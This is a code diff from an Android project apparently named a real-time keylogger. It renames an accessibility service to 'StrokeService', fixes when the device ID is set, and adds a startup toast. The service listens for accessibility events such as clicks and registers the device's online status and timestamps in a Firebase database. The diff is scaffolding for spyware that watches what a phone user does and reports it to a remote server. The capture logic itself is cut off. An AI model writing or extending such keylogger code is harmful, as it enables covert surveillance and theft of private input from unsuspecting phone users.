@@ -4,18 +4,21 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.widget.Toast
 import com.google.firebase.database.*
 import com.shubhamgupta16.realtimekeylogger.utils.getDeviceId
 import com.shubhamgupta16.realtimekeylogger.utils.getDeviceName
 
-class ASEService : AccessibilityService() {
+class StrokeService : AccessibilityService() {
 
     val rtdb = FirebaseDatabase.getInstance().reference
-    private val deviceKey: String = applicationContext.getDeviceId()
+    private var deviceKey: String = ""
 
 
     override fun onServiceConnected() {
         super.onServiceConnected()
+
+        deviceKey = applicationContext.getDeviceId()
 
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
@@ -51,6 +54,8 @@ class ASEService : AccessibilityService() {
             .setValue(ServerValue.TIMESTAMP)
         rtdb.child("devices").child(deviceKey).child("status").onDisconnect()
             .setValue(0)
+
+        Toast.makeText(applicationContext, "Started", Toast.LENGTH_SHORT).show()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
